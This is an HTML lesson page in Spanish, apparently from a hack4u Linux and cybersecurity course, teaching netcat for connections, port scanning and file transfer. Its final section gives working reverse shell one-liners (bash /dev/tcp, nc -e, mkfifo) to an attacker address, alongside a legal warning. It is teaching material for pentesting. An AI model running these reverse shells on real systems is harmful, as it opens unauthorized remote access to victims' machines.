@@ -1,0 +1,245 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>42. Uso de netcat para realizar conexiones | Introducción a Linux</title>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet" />
+    <link rel="stylesheet" href="../../css/styles.css" />
+    <style>
+      .lesson-content {
+        max-width: 800px;
+        margin: 2rem auto;
+        padding: 0 2rem 4rem;
+      }
+      .lesson-content h2 {
+        font-size: 1.5rem;
+        margin: 2rem 0 1rem;
+        color: var(--accent);
+      }
+      .lesson-content h3 {
+        font-size: 1.1rem;
+        margin: 1.5rem 0 0.5rem;
+        color: var(--text-1);
+      }
+      .lesson-content p {
+        color: var(--text-2);
+        margin-bottom: 1rem;
+        line-height: 1.8;
+      }
+      .lesson-content ul, .lesson-content ol {
+        color: var(--text-2);
+        margin-bottom: 1rem;
+        padding-left: 1.5rem;
+      }
+      .lesson-content li { margin-bottom: 0.4rem; }
+      .lesson-content .highlight {
+        background: var(--bg-card);
+        border-left: 3px solid var(--accent);
+        padding: 1rem 1.2rem;
+        border-radius: 0 8px 8px 0;
+        margin: 1rem 0;
+        font-size: 0.9rem;
+      }
+      .lesson-content .warning {
+        background: var(--bg-card);
+        border-left: 3px solid var(--red);
+        padding: 1rem 1.2rem;
+        border-radius: 0 8px 8px 0;
+        margin: 1rem 0;
+        font-size: 0.9rem;
+      }
+      .lesson-content code {
+        font-family: var(--mono);
+        background: var(--bg-hover);
+        padding: 0.1rem 0.4rem;
+        border-radius: 3px;
+        font-size: 0.85rem;
+        color: var(--accent);
+      }
+      .lesson-content pre {
+        background: var(--bg-card);
+        border: 1px solid var(--border);
+        border-radius: 8px;
+        padding: 1rem 1.2rem;
+        margin: 1rem 0;
+        overflow-x: auto;
+      }
+      .lesson-content pre code {
+        background: none;
+        padding: 0;
+        color: var(--text-1);
+      }
+      .lesson-content .step {
+        background: var(--bg-card);
+        border: 1px solid var(--border);
+        border-radius: 8px;
+        padding: 1rem 1.2rem;
+        margin: 0.8rem 0;
+      }
+      .lesson-content .step-num {
+        display: inline-block;
+        background: var(--accent);
+        color: #0a0c10;
+        font-weight: 700;
+        font-size: 0.75rem;
+        padding: 0.15rem 0.5rem;
+        border-radius: 4px;
+        margin-right: 0.5rem;
+        font-family: var(--mono);
+      }
+      .lesson-content table {
+        width: 100%;
+        border-collapse: collapse;
+        margin: 1rem 0;
+        font-size: 0.85rem;
+      }
+      .lesson-content th, .lesson-content td {
+        border: 1px solid var(--border);
+        padding: 0.6rem 0.8rem;
+        text-align: left;
+      }
+      .lesson-content th {
+        background: var(--bg-card);
+        color: var(--text-1);
+        font-weight: 600;
+      }
+      .lesson-content td { color: var(--text-2); }
+      .lesson-nav {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        margin-top: 3rem;
+        padding-top: 1.5rem;
+        border-top: 1px solid var(--border);
+      }
+      .lesson-nav a {
+        color: var(--accent);
+        text-decoration: none;
+        font-size: 0.9rem;
+        font-weight: 500;
+      }
+      .lesson-nav a:hover { text-decoration: underline; }
+      .back-link {
+        display: inline-flex;
+        align-items: center;
+        gap: 0.4rem;
+        color: var(--text-3);
+        text-decoration: none;
+        font-size: 0.85rem;
+        margin-bottom: 1rem;
+      }
+      .back-link:hover { color: var(--accent); }
+    </style>
+  </head>
+  <body>
+    <nav>
+      <a href="../../introduccion-a-linux.html" class="nav-logo">hack<span>4u</span></a>
+      <ul class="nav-links">
+        <li><a href="../../introduccion-a-linux.html">Cursos</a></li>
+        <li><a href="#">Roadmap</a></li>
+        <li><a href="#">Conócenos</a></li>
+      </ul>
+      <div class="nav-cta">
+        <button class="btn-ghost">Iniciar sesión</button>
+        <button class="btn-accent">Registrarse</button>
+      </div>
+    </nav>
+    <div style="background: var(--bg-deep); border-bottom: 1px solid var(--border);">
+      <div class="breadcrumb">
+        <a href="../../introduccion-a-linux.html">Inicio</a><span>›</span>
+        <a href="../../introduccion-a-linux.html">Cursos</a><span>›</span>
+        <a href="../../introduccion-a-linux.html">Introducción a Linux</a><span>›</span>
+        <span style="color: var(--text-2);">Clase 42</span>
+      </div>
+    </div>
+    <div class="lesson-content">
+      <a href="../../introduccion-a-linux.html" class="back-link">← Volver al curso</a>
+      <span class="course-tag">🐧 Linux · Ciberseguridad</span>
+      <h1 class="course-title" style="margin-bottom: 0.5rem;">Uso de netcat para realizar conexiones</h1>
+      <div style="color: var(--text-3); font-size: 0.85rem; margin-bottom: 2rem;">Duración: 9:15 · Sección 2: Temario</div>
+
+      <p>Netcat (<code>nc</code>) es conocido como la "navaja suiza" de las redes. Permite leer y escribir datos a través de conexiones TCP/UDP, siendo una herramienta indispensable en el arsenal de cualquier hacker o administrador. En Ubuntu se instala con <code>sudo apt install netcat-openbsd</code>.</p>
+
+      <h2>Modo cliente y servidor</h2>
+      <p>Netcat puede actuar como cliente (conectarse a un puerto) o como servidor (escuchar en un puerto).</p>
+
+      <pre><code># Modo servidor: escuchar en el puerto 4444
+nc -lvnp 4444
+
+# Modo cliente: conectarse a un servidor
+nc -nv 192.168.1.100 4444
+
+# Explicación de flags:
+# -l : listen (modo escucha)
+# -v : verbose
+# -n : no resolver DNS (más rápido)
+# -p : puerto</code></pre>
+
+      <div class="highlight">
+        <strong>🧠 Flags esenciales:</strong> <code>-v</code> para verbose (ver conexiones entrantes), <code>-n</code> para evitar resolución DNS (evita leaks y acelera), <code>-u</code> para UDP en lugar de TCP.
+      </div>
+
+      <h2>Escaneo de puertos con nc</h2>
+      <p>Netcat permite escanear puertos de forma sencilla, aunque es más lento que nmap. Útil cuando no tenemos nmap disponible.</p>
+
+      <pre><code># Escanear un puerto específico
+nc -zv 192.168.1.1 22
+
+# Escanear un rango de puertos
+for port in {1..1024}; do
+  nc -zv -w1 192.168.1.1 $port 2>&1
+done</code></pre>
+
+      <h2>Transferencia de archivos</h2>
+      <p>Netcat puede transferir archivos entre máquinas sin necesidad de SCP, FTP ni HTTP. Ideal para entornos con herramientas limitadas.</p>
+
+      <pre><code># En la máquina receptora (escucha)
+nc -lvnp 4444 > archivo_recibido.zip
+
+# En la máquina emisora (envía)
+nc -nv 192.168.1.100 4444 < archivo_a_enviar.zip
+
+# También con tar para directorios completos
+# Receptor:
+nc -lvnp 4444 | tar xvz
+# Emisor:
+tar czv directorio/ | nc -nv 192.168.1.100 4444</code></pre>
+
+      <h2>Reverse shell básica</h2>
+      <p>Uno de los usos más importantes en pentesting: obtener una shell remota desde la máquina víctima hacia el atacante.</p>
+
+      <pre><code># Atacante (escucha)
+nc -lvnp 4444
+
+# Víctima (se conecta de vuelta)
+# Bash
+bash -i >& /dev/tcp/192.168.1.100/4444 0>&1
+
+# O con nc (si está instalado en la víctima)
+nc -e /bin/bash 192.168.1.100 4444
+
+# Con mkfifo (cuando nc no tiene -e)
+rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 192.168.1.100 4444 > /tmp/f</code></pre>
+
+      <div class="warning">
+        <strong>⚠️ Legal:</strong> El uso de reverse shells sin autorización explícita es ilegal. Esta técnica debe usarse únicamente en entornos controlados (laboratorios, CTFs, máquinas propias) o con permiso por escrito.
+      </div>
+
+      <div class="lesson-nav">
+        <a href="clase-41.html">← Anterior: Manejo de pares de claves y conexiones SSH</a>
+        <a href="clase-43.html">Siguiente: Uso de conexiones encriptadas →</a>
+      </div>
+    </div>
+    <footer>
+      <div class="footer-logo">hack4u</div>
+      <div class="footer-links">
+        <a href="#">Aviso Legal</a>
+        <a href="#">Política de Cookies</a>
+        <a href="#">Privacidad</a>
+        <a href="#">Términos y Condiciones</a>
+      </div>
+      <div>© 2026 hack4u.io — Todos los derechos reservados.</div>
+    </footer>
+  </body>
+</html>
